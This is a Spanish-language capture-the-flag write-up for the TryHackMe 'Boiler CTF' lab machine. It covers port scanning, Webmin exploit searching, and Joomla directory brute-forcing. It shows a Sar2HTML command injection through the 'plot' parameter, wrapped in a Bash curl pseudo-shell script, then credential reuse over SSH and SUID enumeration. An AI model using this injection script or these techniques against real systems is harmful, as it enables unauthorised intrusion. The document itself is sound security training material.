<!DOCTYPE html><html lang="es" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="días antes"><meta name="hour-prompt" content="horas antes"><meta name="minute-prompt" content="minutos antes"><meta name="justnow-prompt" content="justo ahora"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Boiler CTF (Try Hack Me)" /><meta name="author" content="J0lm3d0" /><meta property="og:locale" content="es" /><meta name="description" content="En este documento se recogen los pasos a seguir para la resolución de la máquina Boiler CTF de la plataforma TryHackMe. Se trata de una máquina Linux de 64 bits, que posee una dificultad media de resolución según la plataforma." /><meta property="og:description" content="En este documento se recogen los pasos a seguir para la resolución de la máquina Boiler CTF de la plataforma TryHackMe. Se trata de una máquina Linux de 64 bits, que posee una dificultad media de resolución según la plataforma." /><link rel="canonical" href="https://j0lm3d0.github.io/posts/boilerctf-(try-hack-me)/" /><meta property="og:url" content="https://j0lm3d0.github.io/posts/boilerctf-(try-hack-me)/" /><meta property="og:site_name" content="J0lm3d0" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-11-25T19:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Boiler CTF (Try Hack Me)" /><meta name="twitter:site" content="@J0lm3d0" /><meta name="twitter:creator" content="@J0lm3d0" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"J0lm3d0"},"dateModified":"2021-11-25T19:00:00+01:00","datePublished":"2021-11-25T19:00:00+01:00","description":"En este documento se recogen los pasos a seguir para la resolución de la máquina Boiler CTF de la plataforma TryHackMe. Se trata de una máquina Linux de 64 bits, que posee una dificultad media de resolución según la plataforma.","headline":"Boiler CTF (Try Hack Me)","mainEntityOfPage":{"@type":"WebPage","@id":"https://j0lm3d0.github.io/posts/boilerctf-(try-hack-me)/"},"url":"https://j0lm3d0.github.io/posts/boilerctf-(try-hack-me)/"}</script><title>Boiler CTF (Try Hack Me) | J0lm3d0</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="J0lm3d0"><meta name="application-name" content="J0lm3d0"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="es"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://cdna.artstation.com/p/assets/images/images/022/342/774/large/nikita-poghainyi-viber-2019-08-04-15-41-05.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">J0lm3d0</a></div><div class="site-subtitle font-italic">CTF Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>HISTÓRICO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/J0lm3d0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/J0lm3d0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://www.linkedin.com/in/j0lm3d0/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Boiler CTF (Try Hack Me)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Boiler CTF (Try Hack Me)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> J0lm3d0 </span> - <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="25 Nov 2021, 19:00" >25 Nov 2021<i class="unloaded">2021-11-25T19:00:00+01:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2220 palabras">12 minutos de lectura</span></div></div><div class="post-content"><p>En este documento se recogen los pasos a seguir para la resolución de la máquina Boiler CTF de la plataforma TryHackMe. Se trata de una máquina Linux de 64 bits, que posee una dificultad media de resolución según la plataforma.</p><p><img data-proofer-ignore data-src="/assets/img/THM/BoilerCTF/machine.png" alt="Logo de la máquina" /></p><p><a href="/pdfs/Write_up_BoilerCTF.pdf">Write-up en PDF realizado mediante LaTeX</a></p><h2 id="enumeración-de-servicios-y-recopilación-de-información-sensible">Enumeración de servicios y recopilación de información sensible</h2><p>Lo primero a realizar es un escaneo de todo el rango de puertos TCP mediante la herramienta <code class="language-plaintext highlighter-rouge">Nmap</code>.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre># nmap -p- --open -T5 -n -vv 10.10.182.219

Not shown: 65436 closed tcp ports (reset), 95 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 63
80/tcp    open  http             syn-ack ttl 63
10000/tcp open  snet-sensor-mgmt syn-ack ttl 63
55007/tcp open  unknown          syn-ack ttl 63
</pre></table></code></div></div><p>Tras obtener los puertos que la máquina tiene abiertos, aplico scripts básicos de enumeración y utilizo la flag -sV para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre># nmap -p21,80,10000,55007 -sC -sV 10.10.182.219

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.41.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kerne
</pre></table></code></div></div><p>Tras el escaneo, lo primero que me llama atención es que el servicio FTP tiene habilitado el login anónimo, por lo que pruebo a acceder para ver el contenido.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre># ftp 10.10.182.219

Connected to 10.10.182.219.                              
220 (vsFTPd 3.0.3)                           
Name (10.10.182.219:j0lm3d0): anonymous         
230 Login successful.                           
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
</pre></table></code></div></div><p>Veo que existe un archivo “oculto” en formato .txt. Descargo el fichero y visualizo su contenido, comprobando que se encuentra codificado en algo que, a primera vista, me parece algún tipo de cifrado César.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre># cat .info.txt

Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
</pre></table></code></div></div><p>Pruebo a decodificarlo utilizando <a href="https://gchq.github.io/CyberChef/">CyberChef</a> y el algoritmo ROT13, obteniendo así el siguiente resultado:</p><p><img data-proofer-ignore data-src="/assets/img/THM/BoilerCTF/infotxtdec.png" alt="Contenido decodificado del fichero de texto" /></p><p>Este fichero no da ninguna información para poder comprometer la máquina, simplemente indica que que se debe realizar una buena enumeración para resolverla (y eso es lo que vamos a hacer).</p><p>El servicio FTP no tiene mucho más que ofrecer, por lo que paso a enumerar los servidores web de los puertos 80 y 10000. El servidor del puerto 80 muestra en su ruta principal la página por defecto de Apache para Ubuntu:</p><p><img data-proofer-ignore data-src="/assets/img/THM/BoilerCTF/mainpage80.png" alt="Página principal del servidor web del puerto 80" /></p><p>Por otra parte, el fichero “robots.txt” que había detectado <em>Nmap</em>, solo tiene deshabilitada la entrada raíz y muestra algunas rutas y unos números que, en principio, apuntan a un <em>rabbit hole</em>, por lo que, por el momento, los descartaré.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre># curl http://10.10.182.219/robots.txt

User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
</pre></table></code></div></div><p>Paso al servidor web del puerto 10000, que está ejecutando un servicio <code class="language-plaintext highlighter-rouge">Webmin</code>, una herramienta de configuración de sistemas a través de la web para sistemas Unix. En la página principal vemos un panel login, pero no disponemos de credenciales.</p><p><img data-proofer-ignore data-src="/assets/img/THM/BoilerCTF/mainpage10000.png" alt="Panel login de Webmin" /></p><p>En el segundo escaneo que realicé anteriormente con <em>Nmap</em>, aparecía la versión utilizada por el servicio (1.930), por lo que utilizo <code class="language-plaintext highlighter-rouge">SearchSploit</code> para buscar algún exploit que me permita bypassear la autenticación.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre># searchsploit Webmin

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                                                                                                            | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                                                                                                           | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                                                                                                                       | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                                                                                                                                                   | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                                                                                                                                          | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                                                                                                                | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                                                                                                                                                    | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                                                                                                                                         | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                                                                                                                                               | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                                                                                                                                         | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                                                                                                      | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                                                                                                                                                    | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                                                                                                                                                       | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                                                                                                     | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                                                                                                                                       | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                                                                                                          | linux/remote/47230.rb
Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                                                                                                                                            | linux/webapps/49318.rb
Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)                                                                                                                                                 | linux/webapps/50144.py
Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF)                                                                                                                                           | linux/webapps/50126.py
Webmin 1.x - HTML Email Command Execution                                                                                                                                                                  | cgi/webapps/24574.txt
Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure                                                                                                                                               | multiple/remote/1997.php
Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure                                                                                                                                               | multiple/remote/2017.pl
Webmin &lt; 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                                                                                              | linux/webapps/47330.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</pre></table></code></div></div><p>Pruebo el exploit 47293 (aplicaría para la versión 1.920), escrito en Bash y que aprovecha la vulnerabilidad CVE-2019-15107, pero la salida me indica que el servidor no es vulnerable.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre># sh 47293.sh https://10.10.182.219:10000

Testing for RCE (CVE-2019-15107) on https://10.10.182.219:10000: OK! (target is not vulnerable)
</pre></table></code></div></div><p>Utilizando <code class="language-plaintext highlighter-rouge">BurpSuite</code>, veo la respuesta del servidor y compruebo que el cambio de contraseña (que era de lo que se aprovechaba la vulnerabilidad) no está habilitado, por lo que esta vía de explotación no es válida:</p><p><img data-proofer-ignore data-src="/assets/img/THM/BoilerCTF/burpresponse.png" alt="Respuesta del servidor capturada desde BurpSuite" /></p><p>Por tanto, vuelvo al servidor del puerto 80, para efectuar una búsqueda de directorios y/o ficheros ocultos mediante fuerza bruta utilizando <code class="language-plaintext highlighter-rouge">Gobuster</code>.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre># gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 80 -x php,txt -r -u http://10.10.182.219

/.htaccess            (Status: 403) [Size: 297]
/.htpasswd.php        (Status: 403) [Size: 301]
/.hta                 (Status: 403) [Size: 292]
/.htpasswd.txt        (Status: 403) [Size: 301]
/.htaccess.php        (Status: 403) [Size: 301]
/.hta.php             (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 297]
/.hta.txt             (Status: 403) [Size: 296]
/.htaccess.txt        (Status: 403) [Size: 301]
/index.html           (Status: 200) [Size: 11321]
/manual               (Status: 200) [Size: 626]  
/robots.txt           (Status: 200) [Size: 257]  
/server-status        (Status: 403) [Size: 301]
/joomla               (Status: 200) [Size: 12463]
</pre></table></code></div></div><p>En la búsqueda encuentro una ruta “/joomla” que contiene, como el nombre indica, un gestor de contenidos <code class="language-plaintext highlighter-rouge">Joomla!</code>.</p><p><img data-proofer-ignore data-src="/assets/img/THM/BoilerCTF/joomlacms.png" alt="Página principal del gestor de contenidos Joomla!" /></p><p>Tras revisar un poco más a fondo, veo que solo hay una entrada publicada sin ninguna información relevante y, además, pruebo a acceder a la ruta “/administrator” para entrar al panel de administrador con credenciales por defecto, pero no lo consigo.</p><p>Es por ello que vuelvo a buscar directorios y ficheros utilizando <em>Gobuster</em> sobre la ruta del gestor <em>Joomla!</em>.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre># gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 80 -x php,txt -r -u http://10.10.182.219/joomla

/.htpasswd            (Status: 403) [Size: 304]
/.hta                 (Status: 403) [Size: 299]
/.htaccess            (Status: 403) [Size: 304]
/.htpasswd.php        (Status: 403) [Size: 308]
/.hta.txt             (Status: 403) [Size: 303]
/.htaccess.php        (Status: 403) [Size: 308]
/_archive             (Status: 200) [Size: 162]
/_files               (Status: 200) [Size: 168]
/_database            (Status: 200) [Size: 160]
/.htpasswd.txt        (Status: 403) [Size: 308]
/.hta.php             (Status: 403) [Size: 303]
/.htaccess.txt        (Status: 403) [Size: 308]
/~www                 (Status: 200) [Size: 162]
/_test                (Status: 200) [Size: 4802]
/administrator        (Status: 200) [Size: 5161]
/bin                  (Status: 200) [Size: 31]  
/build                (Status: 200) [Size: 3391]
/cache                (Status: 200) [Size: 31]  
/components           (Status: 200) [Size: 31]  
/configuration.php    (Status: 200) [Size: 0]   
/images               (Status: 200) [Size: 31]  
/index.php            (Status: 200) [Size: 12484]
/includes             (Status: 200) [Size: 31]   
/index.php            (Status: 200) [Size: 12484]
/installation         (Status: 200) [Size: 5800]
/language             (Status: 200) [Size: 31]   
/libraries            (Status: 200) [Size: 31]   
/LICENSE.txt          (Status: 200) [Size: 18092]
/layouts              (Status: 200) [Size: 31]   
/media                (Status: 200) [Size: 31]   
/modules              (Status: 200) [Size: 31]   
/plugins              (Status: 200) [Size: 31]   
/README.txt           (Status: 200) [Size: 4793]
/templates            (Status: 200) [Size: 31]   
/tests                (Status: 200) [Size: 1556]
/tmp                  (Status: 200) [Size: 31]   
/web.config.txt       (Status: 200) [Size: 1859]
</pre></table></code></div></div><p>A primera vista, me resultan interesantes las rutas que comienzan por el carácter “_”, ya que es algo extraño, y también el fichero “web.config.txt”. Procedo a acceder a las rutas a través del navegador y me doy cuenta de que la mayoría se tratan de archivos <em>troll</em> o <em>rabbit holes</em>, exceptuando la ruta “_test”, que contiene un servicio <code class="language-plaintext highlighter-rouge">Sar2HTML</code>.</p><p><img data-proofer-ignore data-src="/assets/img/THM/BoilerCTF/sar2html.png" alt="Servicio Sar2HTML encontrado en la ruta &quot;/joomla/_test&quot;" /></p><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Con la experiencia de anteriores máquinas, se que este servicio cuenta con una versión vulnerable a ejecución remota de código a través de la variable “plot” de PHP que se define en la URL, por lo que pruebo una inyección básica de comandos.</p><p><img data-proofer-ignore data-src="/assets/img/THM/BoilerCTF/rce.png" alt="RCE a través del servicio Sar2HTML" /></p><p>Como se observa en la imagen, el comando se ejecuta y se muestra la salida en las opciones de uno de los desplegables. Para hacer más visible y rápida esta ejecución de comandos, decido crear un script en Bash que simule una shell realizando peticiones al servidor web mediante <code class="language-plaintext highlighter-rouge">cURL</code>:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c">#Check if the IP address of the victim is passed</span>
<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-eq</span> 1 <span class="o">]</span><span class="p">;</span> <span class="k">then
 while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do</span>

  <span class="c"># Get the command</span>
  <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$ </span><span class="s2">"</span><span class="p">;</span> <span class="nb">read</span> <span class="nt">-r</span> CMD

  <span class="c">#URLEncode the command requested</span>
  <span class="nv">CMD</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$CMD</span> | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">'+'</span><span class="si">)</span>

  <span class="c">#Send a petition to the webserver with the command requested and format the output</span>
  curl <span class="nt">-s</span> <span class="s2">"http://</span><span class="nv">$1</span><span class="s2">/joomla/_test/index.php?plot=;</span><span class="nv">$CMD</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"&lt;option value=(.*?)&gt;"</span> | <span class="nb">tail</span> <span class="nt">-n</span> +5 | <span class="nb">head</span> <span class="nt">-n</span> <span class="nt">-2</span> | <span class="nb">sed</span> <span class="s1">'s/option value=//'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'&lt;&gt;'</span>

 <span class="k">done
else

 </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[!] USAGE: </span><span class="nv">$0</span><span class="s2"> &lt;victim_ip_address&gt;"</span>

<span class="k">fi</span>
</pre></table></code></div></div><p>Listando el directorio actual descubro un fichero de log que, al abrirlo, presenta las credenciales del servicio SSH de un usuario: “basterd”.</p><p><img data-proofer-ignore data-src="/assets/img/THM/BoilerCTF/log.png" alt="Credenciales descubiertas en el fichero &quot;log.txt&quot;" /></p><p>Accedo mediante SSH a la máquina como “basterd” y, en su directorio personal, encuentro un script en Bash llamado “backup”.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="nv">REMOTE</span><span class="o">=</span>1.2.3.4

<span class="nv">SOURCE</span><span class="o">=</span>/home/stoner
<span class="nv">TARGET</span><span class="o">=</span>/usr/local/backup

<span class="nv">LOG</span><span class="o">=</span>/home/stoner/bck.log

<span class="nv">DATE</span><span class="o">=</span><span class="sb">`</span><span class="nb">date</span> +%y<span class="se">\.</span>%m<span class="se">\.</span>%d<span class="se">\.</span><span class="sb">`</span>

<span class="nv">USER</span><span class="o">=</span>stoner
<span class="c">#su*******************s</span>

ssh <span class="nv">$USER</span>@<span class="nv">$REMOTE</span> <span class="nb">mkdir</span> <span class="nv">$TARGET</span>/<span class="nv">$DATE</span>


<span class="k">if</span> <span class="o">[</span> <span class="nt">-d</span> <span class="s2">"</span><span class="nv">$SOURCE</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
    for </span>i <span class="k">in</span> <span class="sb">`</span><span class="nb">ls</span> <span class="nv">$SOURCE</span> | <span class="nb">grep</span> <span class="s1">'data'</span><span class="sb">`</span><span class="p">;</span><span class="k">do
             </span><span class="nb">echo</span> <span class="s2">"Begining copy of"</span> <span class="nv">$i</span>  <span class="o">&gt;&gt;</span> <span class="nv">$LOG</span>
             scp  <span class="nv">$SOURCE</span>/<span class="nv">$i</span> <span class="nv">$USER</span>@<span class="nv">$REMOTE</span>:<span class="nv">$TARGET</span>/<span class="nv">$DATE</span>
             <span class="nb">echo</span> <span class="nv">$i</span> <span class="s2">"completed"</span> <span class="o">&gt;&gt;</span> <span class="nv">$LOG</span>

                <span class="k">if</span> <span class="o">[</span> <span class="nt">-n</span> <span class="sb">`</span>ssh <span class="nv">$USER</span>@<span class="nv">$REMOTE</span> <span class="nb">ls</span> <span class="nv">$TARGET</span>/<span class="nv">$DATE</span>/<span class="nv">$i</span> 2&gt;/dev/null<span class="sb">`</span> <span class="o">]</span><span class="p">;</span><span class="k">then
                    </span><span class="nb">rm</span> <span class="nv">$SOURCE</span>/<span class="nv">$i</span>
                    <span class="nb">echo</span> <span class="nv">$i</span> <span class="s2">"removed"</span> <span class="o">&gt;&gt;</span> <span class="nv">$LOG</span>
                    <span class="nb">echo</span> <span class="s2">"####################"</span> <span class="o">&gt;&gt;</span> <span class="nv">$LOG</span>
                                <span class="k">else
                                        </span><span class="nb">echo</span> <span class="s2">"Copy not complete"</span> <span class="o">&gt;&gt;</span> <span class="nv">$LOG</span>
                                        <span class="nb">exit </span>0
                <span class="k">fi
    done


else

    </span><span class="nb">echo</span> <span class="s2">"Directory is not present"</span> <span class="o">&gt;&gt;</span> <span class="nv">$LOG</span>
    <span class="nb">exit </span>0
<span class="k">fi</span>
</pre></table></code></div></div><p>Al parecer se trata de un script que guardaría una copia del directorio personal del usuario “stoner” en una máquina remota con IP 1.2.3.4. Pero lo que me llama la atención es el comentario, ya que podría ser la contraseña del usuario, al tener un formato similar al de “basterd”.</p><p>Efectivamente, consigo conectarme mediante SSH con las credenciales obtenidas visualizo la primera flag.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>stoner@Vulnerable:~$ cat .secret

*** **** ** **** ****, **** ****.
</pre></table></code></div></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Enumerando el sistema para escalar privilegios, hago una búsqueda de permisos SUID y compruebo que el binario <code class="language-plaintext highlighter-rouge">find</code> cuenta con este permiso.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>stoner@Vulnerable:~$ find / -perm -u=s 2&gt;/dev/null

/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping6
/bin/ping
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/apache2/suexec-custom
/usr/lib/apache2/suexec-pristine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap
/usr/bin/find
/usr/bin/at
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newuidmap
